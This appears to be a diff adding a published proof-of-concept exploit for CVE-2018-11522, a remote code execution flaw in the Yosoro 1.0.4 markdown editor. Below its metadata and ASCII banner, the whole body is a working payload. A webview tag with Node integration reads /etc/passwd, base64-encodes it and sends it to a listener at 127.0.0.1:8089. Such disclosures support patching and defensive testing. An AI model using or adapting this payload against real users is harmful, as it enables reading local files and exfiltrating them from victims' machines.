@@ -1,0 +1,17 @@
+# Exploit title: Yosoro 1.0.4 - Remote Code Execution
+# Date: 2018-05-29
+# Exploit Author: Carlo Pelliccioni
+# Vendor homepage: https://yosoro.coolecho.net/
+# Software link: https://github.com/IceEnd/Yosoro/releases/download/v1.0.4/Yosoro-darwin-x64-1.0.4.zip
+# Version: 1.0.4
+# Tested on: MacOS 10.13.4
+# CVE: CVE-2018-11522
+#  _  _            _    _    _             ___                      _  _         
+# | || | __ _  __ | |__| |_ (_)__ __ ___  / __| ___  __  _  _  _ _ (_)| |_  _  _ 
+# | __ |/ _` |/ _|| / /|  _|| |\ V // -_) \__ \/ -_)/ _|| || || '_|| ||  _|| || |
+# |_||_|\__,_|\__||_\_\ \__||_| \_/ \___| |___/\___|\__| \_,_||_|  |_| \__| \_, |
+
+# Remote Code Execution (CVE-2018-11522)
+# Payload: 
+
+<webview src="data:text/html,<script>var read = require('fs').readFileSync('/etc/passwd', 'utf-8'); document.location='http://127.0.0.1:8089/'+btoa(read); </script>" nodeintegration></webview>
